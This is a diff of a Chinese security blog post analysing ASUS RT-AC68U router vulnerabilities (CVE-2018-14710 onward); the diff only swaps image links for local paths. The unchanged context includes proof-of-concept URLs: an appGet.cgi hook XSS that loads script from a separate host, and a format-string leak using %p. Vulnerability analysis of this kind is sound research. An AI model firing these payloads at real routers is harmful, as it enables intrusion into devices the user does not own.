@@ -69,7 +69,7 @@ source_status: "recorded"
 https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RTAC68U/HelpDesk_BIOS/
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKxxt0Ixibrcciaaok574g3CTFMHWqCHDxqLCSqhslgaebh0HtV4ANDiaoQ/640?wx_fmt=png)
+![](../../.resource/remote/d8dd0cb84f9d0f5bc7cf4767374ee8e5191326e60a65d7e1a302780b0b52b1ea.png)
 
 在github上找到了asuswrt-382的源码，看一下版本还不算老：3.0.0.4.382.51640。
 
@@ -83,7 +83,7 @@ https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT
 
 下一个漏洞修复点为:版本 3.00.4.384.45149。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKXKuibLm4OMaT6sH6pGexibcZKKCHtwPVZKYEic7q4iaqtmI2iabkvVkib07Q/640?wx_fmt=png)
+![](../../.resource/remote/1f0d0b10bda57aca70aa4689955d3ed97314119bff921e92c9139c5a056ced71.png)
 
   
 
@@ -97,25 +97,25 @@ cve-2018-14710~14714
 
 CVE官网上对14710这个CVE的描述为：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eK0ZqWIPkticWUMXoHlEibT2ksE83w3knFbVBJqnMbIvFc0nZgQpwVzg9g/640?wx_fmt=png)
+![](../../.resource/remote/7d7bfbdf858c33ca991f92833e160ff31e6294814ac64f8b22a0765e77eac01b.png)
 
 意思是攻击者可以通过appGet.cgi的url参数hook来执行javascript。
 
 14711：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKvlJnb3qJtOuECDLZmD87bLzyRvZj9IFwic7aToFQ9hZpBBNVPE9cFibw/640?wx_fmt=png)
+![](../../.resource/remote/80350a0286a2f749dcc2057a206a1ef418e95716e87a4715b63997159099ce2c.png)
 
 攻击者构造特殊的urls可以更改状态。
 
 14712:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKNHb6fzLbcLYmfibvuI5iaWkc0ojXLTcAIMvCQXoIZvNjibYm4NzEfCwxw/640?wx_fmt=png)
+![](../../.resource/remote/3659a9e1996918b2b19518476f594e1cf8fc7dbb97df1280aeea5d314b08d485.png)
 
 还可以通过缓冲区溢出造成命令注入。
 
 14713:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKmk4hrgmOtTia1ibezH3COj6hpeO4r38vKHYFNjiaUogzKFGUvJeeY31zw/640?wx_fmt=png)
+![](../../.resource/remote/7c380db59f1c17d113fe57b2f7b0d3545d2c9d8aea3ad2d11b277522a0095f53.png)
 
 通过url参数"load_script"来进行命令注入。
 
@@ -131,31 +131,31 @@ CVE官网上对14710这个CVE的描述为：
 
 我们注意这边的处理逻辑，在handle_request中会依次在mime_handlers列表中对cgi进行匹配。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKws0yLlpHp27dsibloACgab78NTicjibXSddQicQO6aeZYkUvww5rDeSDhw/640?wx_fmt=png)
+![](../../.resource/remote/84f18e3038f2d0a0edb743488cb26245389362df73ff39e44feaccb37170c877.png)
 
 列表保存了对应的六元组结构体，保存了匹配字符串、成员类型、输入函数、输出函数、认证函数等信息。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKonl0DKQRHxL6CAuM0ze7FYFYeovcU2eFvlspiatODtyEg8UjZGlWPZA/640?wx_fmt=png)
+![](../../.resource/remote/79e1d282bb5a3a2ae4be32ecb438b6f63a464b6163294c49fcf4ffead015965b.png)
 
 在匹配到对应项后，会调用output成员函数进行处理，并传入conn_fp，是通过fdopen使一个标准的I / O流与网络套接字的描述符相结合而来的。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKbGtBXGVZxLWXTiaze74OM12Tqt2x9zDb4YQEjN2C4o57YXzEJ8VoZibg/640?wx_fmt=png)
+![](../../.resource/remote/a043dfeff6300ebaa497f5a136bed85aaced81715da28f9278afcb82899d2565.png)
 
 如果访问appGet.cgi，会使用do_appGet_cgi函数进行对应的处理。
 
 对左右括号中的内容进行了提取，并做了相应截断，保存在argv中。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKUBoFwMWGLbL902rUNKo046tevFDLRCnIhcJXNxicmic3mWlRYyLufmXQ/640?wx_fmt=png)
+![](../../.resource/remote/a688f5436d7396d268347245c982f433fa43bfcf1e9d717fbd4ed3135cf126ab.png)
 
 并将hook后跟的函数名与传入参数直接以\%s-%s\的形式写入。fflush清除缓冲区，立即把输出缓冲区的数据进行物理写入。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKe1nAwF5aySibWQ3m8MBVdNWk5ibcYqQpLDicuF2Gbr2t6iano9BX2s44aQ/640?wx_fmt=png)
+![](../../.resource/remote/e77052cd957b8fe8bf9b0f06b28613f1c0e9c67f5a51ec77d67da46838f6d7bb.png)
 
 在do_appGet_cgi中也会从ej_handlers这个列表对hook后跟的函数名进行匹配，如果匹配成功，会调用对应的处理函数。
 
 但是没有找到对应函数时，就会将hook后面的内容返回给用户。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKicUyoWHuDe1mKHbXPsUB7dCrJ07SqvtGLI9JXV6rmtAEmpq6ibgicRicvw/640?wx_fmt=png)
+![](../../.resource/remote/d2814a27cdf9e1e806a82d6da37ab167ab289a0a080d46be62e66a0ec317d13d.png)
 
 常规的我们设计一个弹窗，但这边被过滤掉了，因为前面会提取左右的括号，这里可以设置src标签来部署我们的js脚本在远端上。
 
@@ -167,7 +167,7 @@ http://192.168.1.1/appGet.cgi?hook=bork(<script+src%3dhttp%3a//192.168.1.6%3a800
 
 成功弹窗。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKZUV4OlbQPgAkN6vBqLLcASCuXGN5XsErTOSYsCDwjnb74j34vXZjvg/640?wx_fmt=png)
+![](../../.resource/remote/9a2b14b0cd7d5c0ffd2324000ae35ec9993f05a1f3e11ff96a1673443405fd5d.png)
 
 这样一来就可以运行自己的脚本。
 
@@ -215,7 +215,7 @@ sprintf是不安全的，会将pool中的数据写入到v31数组而造成数组
 http://192.168.1.1/appGet.cgi?hook=nvram_match("model","RT-AC68U","%25p%25p%25p%25p")
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKUTdibTDd7sAJQX4ic5QGkDQeIjN4msfN0m2QEJSzjBYMia23n6Zm09Dvw/640?wx_fmt=png)
+![](../../.resource/remote/69cc60726d6cf6f98d605bb534496c21a519c2fc3a16e93a1d2c6ea85a105e49.png)
 
 这里建议找一些容易确定且不容易变化的键值进行内存泄露。
 
@@ -251,7 +251,7 @@ CVE官网：
 
 CVE-2018-17020
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKjJVGTzEbImkaq7cYO9QRpo39D4Fszl4n2MgeaOXQV3gQZ39bRfxHWg/640?wx_fmt=png)
+![](../../.resource/remote/70dec1881e3dd332e9c558a006964bac35b272373709f3ba4ba740c893044aa1.png)
 
 可以通发送Get包造成拒绝服务攻击。
 
@@ -259,7 +259,7 @@ CVE-ID
 
 CVE-2018-17021
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKIXDJQgEuJ0v4VL8UNhuickx5dyZCUq1sYQBkI8iaxg2iawoa5fAqat2Ew/640?wx_fmt=png)
+![](../../.resource/remote/328327f6eb4651dbd76119fb7db2717f66b55c653a41f794cc0798ed658fa76e.png)
 
 可以通过appGet.cgi注入任意Web或HTML
 
@@ -267,7 +267,7 @@ CVE-ID
 
 CVE-2018-17022
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKZAsp6HXjZpoIM1gZDr6GD8dKlicJ6pBc1n0HicriaDibsMJ6mnKZdfGAjw/640?wx_fmt=png)
+![](../../.resource/remote/121997813dd5b78a4832179e64bb1f17d8cd56d92c7c2b1da76e582fa10f5381.png)
 
 select_list()内使用strcpy，造成栈溢出。
 
@@ -316,7 +316,7 @@ cve-2018-14710~14714
 
 **EDI安全**
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/rJALXSMzgel3K4wjBfL4CI1kyTgKR7eKK4icWK8mYgJXexTqEgrJYxLJPBnhXbOXDRkIYiclVkRYXCXz5VdQQtMQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/e8b0568005557e1391f7eab5821ee0206ef88107813a1e6bcdb68d1269f259ea.jpg)
 
 **扫二维码｜关注我们**
 
